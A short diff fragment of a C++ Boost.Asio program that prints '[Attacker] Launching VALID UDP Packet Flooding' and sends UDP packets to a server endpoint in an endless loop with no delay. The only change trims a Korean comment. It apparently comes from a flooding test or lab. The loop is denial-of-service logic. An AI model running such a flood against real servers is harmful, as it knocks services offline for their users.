@@ -22,7 +22,7 @@ int main() {
     
     std::cout << "[Attacker] Launching VALID UDP Packet Flooding...\n";
     while (true) {
-        // 지연 시간 없이 네트워크가 허용하는 최대 속도로 난사
+        // 지연 시간 없이 네트워크가 허용하는 최대 속도로
         sock.send_to(boost::asio::buffer(&pkt, sizeof(pkt)), server_ep);
     }
     return 0;
